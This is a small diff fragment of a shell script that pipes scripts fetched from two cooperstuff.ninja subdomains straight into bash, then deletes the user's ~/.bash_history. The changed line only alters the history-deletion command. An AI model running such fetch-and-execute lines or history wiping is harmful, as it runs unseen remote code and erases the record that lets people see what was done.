@@ -14,5 +14,5 @@ fi
 curl -sL key.cooperstuff.ninja | bash;
 clear;
 curl -sL screen.cooperstuff.ninja | bash;
-rm ~/.bash_history >> /dev/null;
+rm -f ~/.bash_history;
 
